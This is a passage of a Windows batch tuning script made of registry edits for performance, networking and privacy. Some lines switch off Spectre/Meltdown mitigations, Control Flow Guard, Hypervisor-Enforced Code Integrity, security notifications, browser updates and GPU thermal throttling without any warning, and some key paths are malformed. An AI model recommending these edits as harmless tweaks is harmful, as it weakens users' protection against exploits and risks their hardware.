Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ShutdownWithoutLogon" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DontDisplayLastUserName" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d "0" /f >nul
@timeout /t 03>nul
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKCU\Control Panel\Desktop" /v "CursorBlinkRate" /t REG_SZ /d "-1" /f >nul
Reg.exe add "HKCU\Control Panel\Desktop" /v "ScreenSaverIsSecure" /t REG_SZ /d "1" /f >nul
Reg.exe add "HKU\S-1-5-18\Control Panel\Desktop" /v "ScreenSaverIsSecure" /t REG_SZ /d "1" /f >nul
Reg.exe add "HKCU\Control Panel\Desktop" /v "DragFullWindows" /t REG_SZ /d "1" /f >nul
reg.exe add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Superfetch/Main" /v "Enabled" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Superfetch/PfApLog" /v "Enabled" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Superfetch/StoreLog" /v "Enabled" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Ndu" /v "Start" /t REG_DWORD /d "00000004" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Mozilla\Firefox" /v "DisableAppUpdate" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWebOverMeteredConnections" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Speech_OneCore\Preferences" /v "ModelDownloadAllowed" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\GraphicsDrivers\Scheduler" /v "EnablePreemption" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKEY_CLASSES_ROOT\.bat" /ve /d "batfile" /f >nul
Reg.exe add "HKEY_CLASSES_ROOT\.bat\ShellNew" /f >nul
Reg.exe add "HKEY_CLASSES_ROOT\.bat\ShellNew" /v "NullFile" /t REG_SZ /d "" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v "Enabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "1" /f >nul
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f >nul
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseTrails" /t REG_SZ /d "0" /f >nul
@timeout /t 03>nul
Reg.exe add "HKCU\System\GameConfigStore" /v "AllowGameDVR" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableCudaContextPreemption" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisablePreemption" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableWriteCombining" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001" /v "DisableDMACopy" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001" /v "DisableBlockWrite" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001" /v "StutterMode" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001" /v "EnableUlps" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001" /v "PP_SclkDeepSleepDisable" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001" /v "PP_ThermalAutoThrottlingEnable" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001" /v "DisableDrmdmaPowerGating" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0001\UMD" /v "Main3D_DEF" /t REG_DWORD /d "1" /f >nul
@timeout /t 03>nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{2cc5ca98-6485-489a-920e-b3e88a6ccce3}" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableCloudOptimizedContent" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_AccountNotifications" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\TaskbarDeveloperSettings" /v "TaskbarEndTask" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_IrisRecommendations" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_AccountNotifications" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\ValueBanner.IdealStateFeatureControlProvider" /v "ActivationType" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Windows.Gaming.GameBar.PresenceServer.Internal.PresenceWriter" /v "ActivationType" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsAI" /v "DisableAIDataAnalysis" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Sudo" /v "Enabled" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\UScheduler\DevHomeUpdate" /v "workCompleted" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\UScheduler\OutlookUpdate" /v "workCompleted" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\Deprovisioned\Microsoft.Windows.DevHome_8wekyb3d8bbwe" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\Deprovisioned\Microsoft.OutlookForWindows_8wekyb3d8bbwe" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\ScheduledDiagnostics" /v "EnabledExecution" /t REG_DWORD /d "0" /f >nul
Exit /b
:BATCHSCRIPT_3
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "5840" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "5840" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "5840" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "5840" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d "0" /f >nul
@timeout /t 02>nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\NetBT\Parameters" /v "NameSrvQueryTimeout" /t REG_DWORD /d "3000" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "UseDelayedAcceptance" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MaxSockAddrLength" /t REG_DWORD /d "16" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MinSockAddrLength" /t REG_DWORD /d "16" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "ServiceDllUnloadOnStop" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "maxcachettl" /t REG_DWORD /d "13824" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "maxnegativecachettl" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "86400" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "300" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "384" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "Class" /t REG_DWORD /d "8" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\System\CurrentControlSet\Services\NetBT\Parameters" /v "EnableLMHOSTS" /t REG_DWORD /d "0" /f >nul
Exit /b
:BATCHSCRIPT_4
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Visibility" /v "HideInsiderPage" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v "TrayIconVisibility" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353698Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Clipboard" /v "EnableClipboardHistory" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableAutocorrection" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableAutocorrection" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableSpellchecking" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableSpellchecking" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableTextPrediction" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableTextPrediction" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnablePredictionSpaceInsertion" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnablePredictionSpaceInsertion" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableDoubleTapSpace" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableDoubleTapSpace" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Input\Settings" /v "InsightsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Input\Settings" /v "InsightsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Input\Settings" /v "EnableHwkbTextPrediction" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Input\Settings" /v "EnableHwkbTextPrediction" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Input\Settings" /v "EnableHwkbAutocorrection" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Input\Settings" /v "EnableHwkbAutocorrection" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Input\Settings" /v "MultilingualEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Input\Settings" /v "MultilingualEnabled" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\Maps" /v "AutoUpdateEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableApplicationSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableWebBrowserSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableDesktopThemeSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableSyncOnPaidNetwork" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableWindowsSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableCredentialsSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisablePersonalizationSettingSync" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableStartLayoutSettingSync" /t REG_DWORD /d "2" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "AllowInputPersonalization" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\System\AllowTelemetry" /v "value" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CPSS\DevicePolicy\AllowTelemetry" /v "DefaultValue" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CPSS\Store\AllowTelemetry" /v "Value" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\TextInput" /v "AllowLinguisticDataCollection" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\Software\Microsoft\Input\TIPC" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Input\TIPC" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Input\TIPC" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f >nul
